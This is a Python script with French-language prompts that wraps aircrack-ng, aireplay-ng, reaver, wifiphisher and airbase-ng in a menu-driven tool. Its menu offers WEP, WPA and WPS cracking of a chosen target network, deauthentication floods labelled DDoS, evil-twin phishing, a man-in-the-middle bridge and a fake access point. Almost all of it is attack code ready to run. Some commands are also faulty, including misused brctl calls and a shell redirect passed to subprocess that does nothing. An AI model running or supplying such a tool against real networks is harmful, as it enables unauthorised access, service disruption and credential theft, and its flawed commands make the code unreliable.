import os
import time
from platform import system
import subprocess
def intro():
        print("""   __      __.__  _____._____________           .__   
  /  \    /  \__|/ ____\__\__    ___/___   ____ |  |  
  \   \/\/   /  \   __\|  | |    | /  _ \ /  _ \|  |  
   \        /|  ||  |  |  | |    |(  <_> |  <_> )  |__
    \__/\  / |__||__|  |__| |____| \____/ \____/|____/
         \/  
    ========================================================
    = GITHUB: https://github.com/actonetor                 =
    = INSTAGRAM: lefrentoune                               =
    = TIKTOK: https://tiktok.com/@charlie_bernard_au_fbi   =
    = Actonetor, 2021                                 V2.0 =
    ========================================================""")
def exe():
    os.system("clear")
    intro()
    print("\n    1. WEP cracking \n    2. WPA CRACKING \n    3. WPS CRACKING \n    4. EVIL TWIN \n    5. MITM \n    6. DDos \n    7. HONEYPOT\n\n")
    opt = input("Entrer une options valide >  ")
    if opt == "1":
        os.system("clear")
        intro()
        print()
        subprocess.run(["iwconfig"])
        inter = input("\nEntrer le nom de votre interface >  ")
        os.system("clear")
        intro()
        subprocess.run(["airmon-ng", "start", inter])
        os.system("clear")
        intro()
        os.system("airodump-ng wlan0mon")
        mac = input("\nEntrer l'adresse mac du reseau cible >  ")
        ca = input("Entrer le canal du reseau cible (CH) >  ")
        subprocess.run(["airodump-ng", "--bssid", mac, "--channel", ca, "--write", "WEP_HACK", "wlan0mon"])
        subprocess.run(["aircrack-ng", "WEP_HACK-0*"])
    if opt == "2":
        os.system("clear")
        intro()
        print()
        subprocess.run(["iwconfig"])
        inter = input("\nEntrer le nom de votre interface >  ")
        os.system("clear")
        intro()         
        subprocess.run(["airmon-ng", "start", inter])
        os.system("clear")
        intro()
        os.system("airodump-ng wlan0mon")
        mac = input("\nEntrer l'adresse mac du reseau cible >  ")
        ca = input("Entrer le canal du reseau cible (CH) >  ")
        subprocess.run(["airodump-ng", "--bssid", mac, "--channel", ca, "--write", "WPA_HACK", "wlan0mon"])
        apmac = input("Entrer l'apmac du handshake >  ")
        os.system("clear")
        intro()
        subprocess.run(["aireplay-ng", "--deauth", "10", "-a", apmac, "wlan0mon", "--ignore-negative-one"])
        subprocess.run(["aircrack-ng", "WPA_HACK-01.cap", "-w", "/usr/share/wordlist/rockyou.txt"])
    if opt == "3":
        os.system("clear")
        intro()
        print()
        subprocess.run(["iwconfig"])
        inter = input("\nEntrer le nom de votre interface >  ")
        os.system("clear")
        intro()
        subprocess.Popen(["airmon-ng", "start", inter])
        subprocess.Popen(["ifconfig", "wlan0mon", "up"])
        subprocess.run(["wash", "-i", "up"])
        apmac = input("\nEntrer l'apmac du reseau >  ")
        os.system("clear")
        intro()
        subprocess.Popen(["reaver", "-i", "wlan0mon", "-b", apmac, "-vv"])
        subprocess.run(["reaver", "-i", "wlan0mon", "-b", apmac, "-vv"])
    if opt == "4":
        subprocess.run(["wifiphisher"])
        subprocess.run(["wifiphisher", "--force-hostapd"])
    if opt == "5":
        os.system("clear")
        intro()
        essid = input("Entrer le bssid >  ")
        subprocess.run(["airbase-ng", "-e", essid, "-c", "10", "wlan0mon"])
        subprocess.Popen(["brctl", "addbr", essid + "-bridge"])
        subprocess.Popen(["brctl", "addbr", essid + "-bridge", "enp0s10"])
        subprocess.Popen(["brctl", "addbr", essid + "-bridge", "at0"])
        subprocess.Popen(["ifconfig", "enp0s10", "0.0.0.0", "up"])
        subprocess.Popen(["ifconfig", "at0", "0.0.0.0", "up"])
        subprocess.Popen(["ifconfig", essid + "-bridge", "192.168.8.10", "up"])
        subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
        subprocess.run(["airmon-ng", "start", "wlp5s0"])
        subprocess.run(["service", "apache2", "start"])
    if opt == "6":
        os.system("clear")
        intro()
        print()
        subprocess.run(["airmon-ng"])
        inter = input("\nEntrer votre interface >  ")
        subprocess.Popen(["airmon-ng", "start", inter])
        os.system("airodump-ng wlan0mon")
        apmac = input("\nEntrer l'apmac du reseau >  ")
        os.system("clear")
        intro()
        print()
        subprocess.run(["aireplay-ng", "-0", "0", "-a", apmac, "--ignore-negative-one", "wlan0mon"])
    if opt == "7":
        os.system("clear")
        intro()
        print()
        essid = input("Entrer le essid >  ")
        subprocess.run(["airbase-ng", "-c", "3", "-e", essid, "wlan0mon"])





def all():
    if system() == "Windows":
        os.system("clear")
        print("Executer se tool sur un system d'exploitation sous Debian ou Unix pour les performances les plus forte !\n")
        quit()
        
    if not 'SUDO_UID' in os.environ.keys():
        os.system("clear")
        print("Réexecuter au plus vite ce programme avec sudo !!!")
        quit()
    os.system("clear")
    print("""   __      __.__  _____._____________           .__   
  /  \    /  \__|/ ____\__\__    ___/___   ____ |  |  
  \   \/\/   /  \   __\|  | |    | /  _ \ /  _ \|  |  
   \        /|  ||  |  |  | |    |(  <_> |  <_> )  |__
    \__/\  / |__||__|  |__| |____| \____/ \____/|____/
         \/  
    ========================================================
    = GITHUB: https://github.com/actonetor                 =
    = INSTAGRAM: lefrentoune                               =
    = TIKTOK: https://tiktok.com/@charlie_bernard_au_fbi   =
    = Actonetor, 2021                                 V2.0 =
    ========================================================
    *Taper la commande help pour afficher les options*\n\n""")
    time.sleep(1)
    terminal_lancé = True
    terminal_nom = "WifiTool"
    utilisateur_commande = ""
    while terminal_lancé:
        utilisateur_commande = input(f"[{terminal_nom}]> ")
        if utilisateur_commande == "clear":
            os.system("clear")
            intro()
            print("    *Taper la commande help pour afficher les options*\n\n")
        if utilisateur_commande ==  "help":
            print("\n1. exe \n2. nom \n3. clear \n4. help \n5. quit\n")
        if utilisateur_commande == "":
            pass
        if utilisateur_commande == "quit":
            terminal_lancé = False
        if utilisateur_commande == "nom":
            terminal_nom = input("Entrer le nouveau nom > ")
        if utilisateur_commande == "exe":
            exe()
        else:
            print("Commande non détécter.....")
            pass
all()
